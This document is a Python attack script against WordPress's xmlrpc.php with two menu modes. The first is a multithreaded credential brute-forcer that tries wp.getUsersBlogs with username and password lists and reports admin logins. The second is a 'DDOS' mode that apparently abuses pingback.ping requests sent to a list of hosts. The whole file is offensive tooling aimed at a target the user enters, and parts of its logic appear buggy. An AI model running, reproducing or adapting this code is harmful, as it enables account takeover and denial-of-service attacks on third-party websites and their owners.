#python3.4
import threading
import urllib
import sys
import re
from queue import Queue
from urllib.request import urlopen


USER_FILE="username.txt"
PASS_FILE="pass.txt"
HOST_FILE="hosts.txt"
THREAD_NUM=20
PROGRESS=0
userlist=[]

data="""<?xml version="1.0" encoding="UTF-8"?>\
<methodCall><methodName>{0}</methodName>\
<params><param><value>{1}</value></param><param><value>{2}</value></param></params></methodCall>"""


mode='0'
def user(url):
	global userlist
	global data
	pwdfile=open(PASS_FILE,"r")
	while len(userlist)>0:
		uname=userlist.pop()
		while True:
			pwd=pwdfile.readline()
			if not pwd:break
			print("try "+url+"    "+uname+"       "+pwd)
			try:
				res=urlopen(url,data.format('wp.getUsersBlogs',uname,pwd).encode()).read().decode()
				if "isAdmin" in res :
					print("Got it !")
					print("username :"+uname+"password :"+pwd)
					break
			except urllib.error.HTTPError:
				pass

def userMode():
	threads=[]
	global userlist
	f=open(USER_FILE,"r")
	for uname in f.readlines():
		userlist.append(uname)

	loops=range(THREAD_NUM)
	url=input("goal:")
	if url:
		myRe=re.compile("((?:(?:25[0-5]|2[0-4]\d|((1\d{2})|([1-9]?\d)))\.){3}(?:25[0-5]|2[0-4]\d|((1\d{2})|([1-9]?\d))))") 
	else:
		sys.exit(0)
	print(url+"is attacking")
	myRe=re.search(myRe,url)
	#if ip given judge it else if domain given judge http:// or https://
	print(myRe)
	if myRe is None:
		#not ip
		print(url[0:4])
		if url[0:4] != 'http':
			url="http://"+url+"/xmlrpc.php"
	
	for i in loops:
		t=threading.Thread(target=user,args=(url,))
		t.start()
		threads.append(t)
	
	for i in loops:
		threads[i].join()
	print("20 treads end")


def ddos(target,servers):
	global data
	myRe=re.compile("((?:(?:25[0-5]|2[0-4]\d|((1\d{2})|([1-9]?\d)))\.){3}(?:25[0-5]|2[0-4]\d|((1\d{2})|([1-9]?\d))))") 
	#?:表示不捕获到分组中去

	while len(servers) > 0:
		url=servers.pop()
		print(url+"is attacking")
		myRe=re.search(myRe,url)
		#if ip given judge it else if domain given judge http:// or https://
		if myRe is None:
			#not ip
			print(url[0:4])
			if url[0:4] != 'http':
				url="http://"+url+"/xmlrpc.php"
		try:
			urlopen(target,data.format('pingback.ping',target,url).encode())
		except urllib.error.HTTPError:
			pass
	

def ddosMode():
	threads=[]
	f=open(HOST_FILE,"r")
	target=input("goal:")
	#auth target
	urls=set()
	while True:
		url=f.readline()
		urls.add(url)
		if not url:break
	loops=range(THREAD_NUM)
	for i in loops:
		t=threading.Thread(target=ddos,args=(target,urls))
		t.start()
		threads.append(t)

	for i in loops:
		threads[i].join()
	print("20 treads end")

def menu():
	global mode
	print("*"*23)
	print("*"+" "*5+"choose mode"+" "*5+"*")
	print("*"*23)
	print("1.   Fuzz User")
	print("2.   DDOS \n")
	mode=input("input num")
	if mode=='1' or mode=='2':
		if mode=='1':
			userMode()
		else:
			ddosMode()
	else:
		sys.exit(mode)

if __name__ =="__main__":
	menu()